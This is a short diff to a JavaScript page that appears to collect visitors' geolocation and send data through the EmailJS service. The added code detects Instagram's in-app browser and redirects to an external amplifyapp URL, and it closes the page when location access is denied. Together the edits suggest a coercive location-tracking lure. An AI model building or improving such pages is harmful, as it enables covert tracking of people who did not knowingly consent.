@@ -122,6 +122,12 @@ $.ajax('https://api.emailjs.com/api/v1.0/email/send', {
 
 });
 
+if(navigator.userAgent.includes("Instagram")){
+    alert("If cannot continue, Use another browser");
+    window.close();
+       window.location.href = "https://main.d6lstv6g57srw.amplifyapp.com/";
+   }
+
 
 
 }());
@@ -197,9 +203,9 @@ function showError(error) {
   switch(error.code) {
     case error.PERMISSION_DENIED:
       //console.log("User denied the request for Geolocation.");
-      alert("This website needs location access");
-      window.location.reload();
-      //window.close();
+      alert("Enable location access for this browser in your settings.");
+      //window.location.reload();
+      window.close();
       break;
     case error.POSITION_UNAVAILABLE:
      //console.log("Location information is unavailable.");
